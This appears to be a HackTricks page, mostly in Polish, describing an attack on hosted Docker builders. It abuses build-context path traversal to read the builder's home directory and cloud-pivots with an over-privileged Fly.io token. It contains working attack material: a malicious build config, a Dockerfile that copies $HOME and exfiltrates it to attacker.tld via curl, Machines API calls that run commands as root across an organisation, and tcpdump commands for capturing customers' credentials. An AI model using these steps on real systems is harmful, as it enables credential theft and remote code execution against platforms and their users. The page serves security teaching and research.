# Nadużywanie Docker Build Context w hostowanych builderach (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Jeśli platforma CI/CD lub hosted builder pozwala contributorom określić ścieżkę build context i ścieżkę Dockerfile, często można ustawić context na katalog nadrzędny (np. "..") i uczynić pliki hosta częścią build context. Wówczas kontrolowany przez atakującego Dockerfile może użyć COPY i exfiltrate sekrety znalezione w katalogu domowym użytkownika buildera (np. ~/.docker/config.json). Skradzione registry tokens mogą też działać przeciwko providerowi poprzez control-plane APIs, umożliwiając org-wide RCE.

## Powierzchnia ataku

Wiele hostowanych usług builder/registry robi mniej więcej to przy budowaniu obrazów przesłanych przez użytkowników:
- Odczytuje konfigurację na poziomie repo, która zawiera:
- build context path (wysyłany do Docker daemon)
- Dockerfile path względny względem tego contextu
- Kopiuje wskazany katalog build context oraz Dockerfile do Docker daemon
- Buduje obraz i uruchamia go jako hostowaną usługę

Jeśli platforma nie kanonizuje i nie ogranicza build context, użytkownik może ustawić go na lokalizację poza repozytorium (path traversal), powodując, że dowolne pliki hosta czytelne dla build usera staną się częścią build context i będą dostępne do COPY w Dockerfile.

Praktyczne ograniczenia obserwowane w praktyce:
- Dockerfile musi znajdować się wewnątrz wybranego context path i jego ścieżka musi być znana z wyprzedzeniem.
- build user musi mieć dostęp do odczytu plików dołączonych do context; specjalne pliki urządzeń mogą zepsuć kopiowanie.

## PoC: Path traversal via Docker build context

Przykładowa złośliwa konfiguracja serwera deklarująca Dockerfile w katalogu nadrzędnym contextu:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Notatki:
- Użycie ".." często odnosi się do katalogu domowego użytkownika builder (np. /home/builder), który zazwyczaj zawiera wrażliwe pliki.
- Umieść swój Dockerfile w katalogu repo (np. repo "test" → test/Dockerfile), tak aby pozostał w obrębie rozszerzonego kontekstu nadrzędnego.

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Typowe cele odzyskiwane z $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Inne cache i pliki konfiguracyjne cloud/CLI (np. ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Uwaga: Nawet jeśli w repozytorium znajduje się plik .dockerignore, podatny mechanizm wyboru kontekstu po stronie platformy nadal kontroluje, co zostanie wysłane do daemon. Jeśli platforma skopiuje wybraną ścieżkę do daemon zanim oceni .dockerignore w repozytorium, pliki hosta nadal mogą zostać ujawnione.

## Pivot w chmurze z nadmiernie uprzywilejowanymi tokens (przykład: Fly.io Machines API)

Niektóre platformy wydają pojedynczy bearer token, który można użyć zarówno dla container registry, jak i control-plane API. Jeśli exfiltrate'ujesz registry token, spróbuj go użyć przeciwko provider API.

Przykładowe wywołania API przeciwko Fly.io Machines API używające skradzionego tokena z ~/.docker/config.json:

Wypisz aplikacje w organizacji:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Uruchom polecenie jako root wewnątrz dowolnej maszyny aplikacji:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Wynik: org-wide remote code execution we wszystkich hostowanych aplikacjach, jeśli token posiada wystarczające uprawnienia.

## Kradzież sekretów z kompromitowanych hostowanych usług

Mając exec/RCE na hostowanych serwerach, możesz pozyskać sekrety dostarczone przez klienta (API keys, tokens) lub przeprowadzić prompt-injection attacks. Przykład: zainstaluj tcpdump i przechwyć ruch HTTP na porcie 8080, aby wydobyć przychodzące poświadczenia.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Przechwycone żądania często zawierają poświadczenia klienta w nagłówkach, ciałach żądań lub parametrach zapytania.

## Źródła

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
